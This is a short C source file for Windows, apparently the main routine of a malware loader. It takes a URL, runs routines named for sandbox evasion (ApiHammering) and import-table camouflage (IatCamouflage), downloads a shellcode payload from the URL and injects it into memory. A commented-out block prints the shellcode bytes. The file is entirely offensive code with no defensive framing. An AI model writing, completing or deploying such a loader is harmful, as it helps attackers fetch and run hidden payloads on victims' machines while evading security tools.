#include <Windows.h>
#include <stdio.h>
#include <string.h>
#include "include/common.h"

int main(int argc, char* argv[])
{
    if (argc != 2) {
        fprintf(stderr, "Usage: %s <url/endpoint>\n", argv[0]);
        return -1;
    }

    PSTR fullUrl = argv[1];
   
    

    if (fullUrl == NULL) {
        fprintf(stderr, "Invalid format. Expected format: <url/endpoint>\n");
        return -1;
    }

    ApiHammering(2000);

    IatCamouflage();

    unsigned char* pPayload = NULL;

    SIZE_T sSize = Download(&pPayload, fullUrl, FALSE);

    if (sSize == -1)
        goto _Cleanup;

    // Printing shellcode
    /*printf("[*] Shellcode: \n");
    for (SIZE_T i = 0; i < sSize; i++)
    {
        printf("%02X ", pPayload[i]);
    }
    printf("\n");*/

    if (InitiateInjection(pPayload, sSize))
    {
        return -1;
    }

_Cleanup:
    return 0;
}
